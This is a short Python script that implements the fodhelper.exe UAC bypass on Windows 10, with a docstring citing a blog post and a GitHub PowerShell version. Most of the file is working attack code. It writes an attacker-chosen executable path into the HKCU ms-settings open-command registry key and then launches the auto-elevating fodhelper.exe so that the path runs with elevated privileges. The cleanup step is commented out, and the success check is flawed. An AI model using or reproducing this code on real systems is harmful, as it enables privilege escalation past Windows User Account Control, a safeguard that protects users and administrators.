"""
https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
	
Fodhelper.exe was introduced in Windows 10 to manage optional features like
region-specific keyboard settings. Its location is: C:\Windows\System32\fodhelper.exe
and it is signed by Microsoft.
"""
  
import os
import _winreg
import requests

def fodhelper_dll_hijack(executable_path):
	registry_path = r"Software\Classes\ms-settings\Shell\Open\command"
	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,registry_path)
		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,executable_path)
	except Exception as e:
		return False

	try:
		if (os.popen("C:\Windows\System32\fodhelper.exe") == 0):
			return True
		else:
			return False
	except Exception as e:
		return False
		
	#try:
	#	_winreg.DeleteKey("Software\Classes\ms-settings\Shell\Open\command")
	#except Exception as e:
	#	return False
